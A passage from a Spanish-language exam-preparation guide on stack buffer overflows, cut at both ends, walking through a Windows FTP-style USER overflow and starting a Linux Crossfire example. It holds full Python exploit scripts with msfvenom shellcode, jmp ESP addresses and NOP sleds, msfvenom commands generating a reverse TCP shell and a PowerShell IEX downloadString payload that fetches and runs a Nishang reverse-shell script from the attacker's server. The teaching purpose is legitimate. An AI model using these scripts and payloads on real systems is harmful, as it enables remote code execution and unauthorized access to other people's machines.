  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>La razón por la cual se han insertado los <strong>NOP-sled</strong> (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el <strong>Immunity Debugger</strong> para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.</p>
<p>Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.</p>
<h4 id="salto-al-esp">Salto al ESP<a class="headerlink" href="#salto-al-esp" title="Permanent link">&para;</a></h4>
<p>Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecución exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitúa en el registro <strong>ESP</strong> por un lado y dado que tenemos el control del registro <strong>EIP</strong> por otro... la idea es hacer que el registro <strong>EIP</strong> apunte hacia el registro <strong>ESP</strong>.</p>
<p>Para ello, no es tan simple como especificar en <em>Little Endian</em> la dirección del registro <strong>ESP</strong>, pues no funcionará. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una dirección de la memoria con permisos de ejecución y <strong>ASLR</strong> desactivado donde se aplique una instrucción de tipo '<strong>jmp ESP</strong>'. De esta forma, conseguiremos tras apuntar a dicha dirección, que la siguiente instrucción a realizar corresponda a los <strong>NOP's</strong> iniciales del registro <strong>ESP</strong> hasta llegar a nuestro <strong>Shellcode</strong>.</p>
<p>Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde <strong>Immunity Debugger</strong>, es aplicar el siguiente comando en la línea de comandos interactiva de la herramienta:</p>
<p><code>!mona modules</code></p>
<p>Una vez hecho, se nos listarán un puñado de módulos, de entre los cuales deberemos buscar cuáles no poseen mecanismos de protección y tienen el ASLR desactivado. Para la examinación del OSCP, siempre habrá uno que reúna dichas condiciones.</p>
<p>Tras encontrar el módulo, desde las pestañas superiores en <strong>Immunity Debugger</strong> (las letras iniciales), una de ellas nos permite visualizar si el campo <em>.text</em> del módulo en la memoria tiene permisos de ejecución, en caso de ser así, el módulo seleccionado es un candidato perfecto.</p>
<p>La idea una vez teniendo el módulo candidato, es ver en qué porción de la memoria se está aplicando un salto al registro ESP. Para realizar esta búsqueda, analizamos el equivalente OPCode de la instrucción haciendo uso para ello de la utilidad <strong>nasm_shell.rb</strong> de Metasploit:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm<span class="w"> </span>&gt;<span class="w"> </span>jmp<span class="w"> </span>esp
<span class="m">00000000</span><span class="w">  </span>FFE4<span class="w">              </span>jmp<span class="w"> </span>esp
nasm<span class="w"> </span>&gt;
</code></pre></div>

<p>Sabiendo que a nivel de OPCode, un '<strong>jmp ESP</strong>' figura como <strong>FFE4</strong>, podemos a continuación desde Mona en la línea de comandos interactiva de <strong>Immunity Debugger</strong> realizar la siguiente consulta en la sección de módulos:</p>
<p><code>find -s "\xff\xe4" -m modulo.dll</code></p>
<p>Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.</p>
<p>Haciendo doble-click en la misma, podremos ver desde la interfaz principal de <strong>Immunity Debugger</strong> como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es <strong>0x12131415</strong>, se deberían de aplicar al script los siguientes cambios:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\x8a\x41\xbe\xe1\x9e</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x15\x14\x13\x12</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1300</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">351</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Consiguiendo así que el registro <strong>EIP</strong> apunte a dicha dirección donde posteriormente se aplica el salto al registro <strong>ESP</strong>.</p>
<p>Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</code></pre></div>

<p>La funcionalidad del <strong>pack</strong> nos permite poner en formato <em>Little Endian</em> una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\x8a\x41\xbe\xe1\x9e</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="mh">0x12131415</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1300</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">351</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Podemos establecer <strong>BreakPoints</strong> desde Immunity Debugger en dicha dirección (pulsando <strong>F2</strong> para ello sobre la dirección), a fin de corroborar que se produce una detención en la ejecución del programa tras el registro <strong>EIP</strong> pasar por la dirección <strong>0x12131415</strong>. En caso de ser así, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla <strong>F8</strong> una vez alcanzado el breakpoint, vemos que la siguiente instrucción a realizar corresponde al primer <strong>NOP-sled</strong> del registro <strong>ESP</strong>.</p>
<p>Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.</p>
<h4 id="mejorando-el-exploit">Mejorando el Exploit<a class="headerlink" href="#mejorando-el-exploit" title="Permanent link">&para;</a></h4>
<p>De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai -f c
</code></pre></div>

<p>De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.</p>
<p>Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.</p>
<p>En caso de querer mejorar un pelín más nuestro script, contamos con otra vía de tratar los 16 <strong>NOPs</strong> que hemos insertado al principio del registro <strong>ESP</strong>. Se suele considerar más óptimo insertar al principio del registro <strong>ESP</strong> el siguiente Opcode en vez de los <strong>NOPs</strong>, seguidamente continuando con el Shellcode:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb </span>
nasm<span class="w"> </span>&gt;<span class="w"> </span>sub<span class="w"> </span>esp,0x10
<span class="m">00000000</span><span class="w">  </span>83EC10<span class="w">            </span>sub<span class="w"> </span>esp,byte<span class="w"> </span>+0x10
</code></pre></div>

<p>Insertamos al principio del registro <strong>ESP</strong> el Opcode "<strong>\x83\xEC\x10</strong>", continuando con el Shellcode. Se considera más óptimo, pues dicha instrucción arrastra el <strong>ESP</strong> lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar <strong>NOPs</strong> hasta que validemos manualmente que rule (calculando offsets). </p>
<p>Lo bueno de esta técnica a su vez es que siempre funciona (¿Habrá que tener en cuenta los badchars?, habrá que investigar).</p>
<h4 id="reduciendo-el-size-y-acceso-por-powershell">Reduciendo el Size y Acceso por Powershell<a class="headerlink" href="#reduciendo-el-size-y-acceso-por-powershell" title="Permanent link">&para;</a></h4>
<p>En caso de que nuestro <strong>Size</strong> en el <strong>ESP</strong> antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.</p>
<p>La idea para este caso, va a ser obtener una sesión reversa TCP vía <strong>Powershell</strong> aprovechando la utilidad de <strong>Nishang</strong>, concretamente la utilidad <strong>Invoke-PowerShellTcp.ps1</strong>. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:</p>
<p><code>Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443</code></p>
<p>De esta forma, nos aprovecharemos de <strong>msfvenom</strong> para generar una sentencia como la siguiente:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/exec<span class="w"> </span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://127.0.0.1:8000/PS.ps1&#39;)&quot;</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00\x0a\x0d&quot;</span>

Payload<span class="w"> </span>size:<span class="w"> </span><span class="m">299</span><span class="w"> </span>bytes
Final<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>c<span class="w"> </span>file:<span class="w"> </span><span class="m">1280</span><span class="w"> </span>bytes
unsigned<span class="w"> </span>char<span class="w"> </span>buf<span class="o">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="s2">&quot;\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;</span>
<span class="s2">&quot;\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29&quot;</span>
<span class="s2">&quot;\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a&quot;</span>
<span class="s2">&quot;\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf&quot;</span>
<span class="s2">&quot;\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78&quot;</span>
<span class="s2">&quot;\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b&quot;</span>
<span class="s2">&quot;\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97&quot;</span>
<span class="s2">&quot;\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62&quot;</span>
<span class="s2">&quot;\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c&quot;</span>
<span class="s2">&quot;\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d&quot;</span>
<span class="s2">&quot;\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0&quot;</span>
<span class="s2">&quot;\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa&quot;</span>
<span class="s2">&quot;\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a&quot;</span>
<span class="s2">&quot;\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d&quot;</span>
<span class="s2">&quot;\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89&quot;</span>
<span class="s2">&quot;\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c&quot;</span>
<span class="s2">&quot;\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9&quot;</span>
<span class="s2">&quot;\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9&quot;</span>
<span class="s2">&quot;\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b&quot;</span>
<span class="s2">&quot;\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15&quot;</span><span class="p">;</span>
</code></pre></div>

<p>Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.</p>
<p>Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.</p>
<h1 id="buffer-overflow-linux">Buffer Overflow Linux<a class="headerlink" href="#buffer-overflow-linux" title="Permanent link">&para;</a></h1>
<p>Hasta donde yo se, no es común que caiga un <em>Buffer Overflow</em> de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo <strong>Crossfire</strong>.</p>
<h4 id="fuzzing_1">Fuzzing<a class="headerlink" href="#fuzzing_1" title="Permanent link">&para;</a></h4>
<p>Para esta primera parte, contamos con el siguiente POC:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span> 

<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;192.168.1.X&quot;</span> 

